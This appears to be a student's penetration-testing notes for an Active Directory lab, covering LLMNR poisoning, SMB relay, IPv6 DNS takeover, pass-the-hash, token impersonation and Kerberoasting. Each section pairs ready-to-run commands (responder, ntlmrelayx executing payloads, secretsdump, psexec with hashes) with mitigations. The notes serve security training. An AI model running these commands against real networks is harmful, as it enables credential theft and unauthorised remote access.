- In Scope:
	192.168.0.109 -> DC
	192.168.0.105 -> User 01

# RESOURCES
- [Top five ways to get initial access](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
- [Kerberoasting](https://medium.com/r3d-buck3t/attacking-service-accounts-with-kerberoasting-with-spns-de9894ca243f)


# INITIAL ATTACK VECTORS
1. **LLMNR Poisoning**
- Link Local Multicast Name Resoultion
- It indentifies host when DNS fails to do so.
- Also knwn as NetBIOS / NBT-NS
- Responds with a user hash.
- Working:
	- User mis-types server/host it wants to connect.
	- So, server broadcasts it over network.
	- Then, attacker sends response to get hash.
	- User simply sends hash to attacker.
- Mitigations:
	- Disable LLMNR and NBT-NS
	- or Enable network access control
	- Use strong passwords
- Commands:
```bash
# Run responder
sudo responder -I <interface> -dw

# Crack captured NTLM/v2 hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -O
```

2. **SMB Relay**
- Relay hashes captured by responder to other machine.
- It also dumps the SAM hashes of target machine.
- Requirements:
	- SMB signing must be disabled on target!!!
	- Relayed credentials must be of admin!!!
- Mitigations:
	- Enable SMB signing.
	- Disable NTLM authentication on network.
	- Account tiering.
	- Local admin restriction.
- Commands:
```bash
# Turn off SMB and HTTP response in /etc/responder/Responder.conf

# Discover hosts with SMB sigining disabled
nmap --script=smb2-security-mode.nse -p445 <IP/network>

# Run responder
sudo responder -I <interface> -dw

# Run ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Run ntlmrelayx and get shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Run ntlmrelayx and execute meterpreter payload
impacket-ntlmrelayx -tf targets.txt -smb2support -e shell.exe

# Run ntlmrelayx and run command on target
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```

3. **DNS takeover via IPv6** -> [Additional Reading - Delegate Access](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
- If IPv6 is turned on then mostly nobody is doing DNS for it.
- So, we can spoof the IPv6 DNS.
- We can get authetication to DC via LDAP or machine reboot.
- We capture hash and LDAP relay it to DC and create new account (if domain admin).
- Mitigations:
	- Define block rules in firewall
	- If not using WPAD, then disable it via Group Policy
	- Enable LDAP signing and LDAP channel binding
	- Consider admin users to protected users
- Commands:
```bash
# Run mitm6
sudo mitm6 -d <domain>

# Also run ntlmrelayx in IPv6 mode
impacket-ntlmrelayx -6 -t ldaps://<DC ip> -wh fakewpad.marvel.local -l lootme
```

4. **Pass-Back Attack** -> [Reading](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)
- Printers / Devices using default credentials on web login
- Look for something that connect to LDAP or utilizes SMB

## Gaining Shell Access
- If have credentilas or user's hash, try:
	- smbexec
	- psexec
	- wmiexec
- etc...


# POST COMPROMISE: ENUMERATION
1. [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)   ->  [Commands/Functions Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
2. Bloodhound  & sharphound ->  [Hacktricks Guide](https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound)


# POST COMPROMISE: ATTACKS
- Have some sort of credentials or shell access to target.

1. **Pass the Hash / Password**
- If have SAM hashes or Cracked hash and has password, then pass it.
- Mitigations:
	- Limit account re-use
	- Use strong passwords
	- Privilege Access Management (PAM)
- Commands:
```bash
# Pass the password accross network
crackmapexec smb <ip/cidr> -u <username> -d <domain> -p <password>

# Dump hashes with secretsdump from impacket
impacket-secretsdump <domain>/<username>:<password>@<ip>

# Pass the hash accross network
crackmapexec smb <ip/cidr> -u "<full username>" -H <hash> --local-auth

# Pass the hash and get shell
psexec '<full username>:@<target ip>' -hashes <lm:nt hashes>
```


2. **Token Impersonation**
- Token allow user to access system/network without having to provide credentials again and again.
- For example:  Cookies for computers
- Two types:
	+ Delegate -> Used when user logs in to a machine
	+ Impersonate -> Non-interactive such as attaching network drive
- Mitigations:
	- Limit user/group token creation permissions.
	- Account tiering
	- Local admin restriction
- Commands:
```bash
# Works with metasploit
# Once have shell on target
load incognito

list_tokens -u

impersonate_token <username>
```


3. **Kerberoasting**
- Any valid user can request TGT 
- With that TGT, we can request a service ticket TGS
- Goal -> Get TGS and decrypt/crack server's account hash.
- Mitigations:
	- Stong passwords
	- Least privileges
- Commands:
```bash
# Synchronize your time with DC
sudo ntpdate <DC ip>

# Request TGS
impacket-GetUserSPNs -request <domain>/<username>:<password> -dc-ip <DC ip> -outputfile hash.kerberos
```


4. **[GPP / cPassword Attack / MS14-025](https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)**
- Group Policy Preferences allow admins to create policies with embedded encrypted passwords in xml files.
- Credentials stored in cPassword file and key was accidently leaked.
- Use metasploit `smb_enum_gpp` module to enumerate it.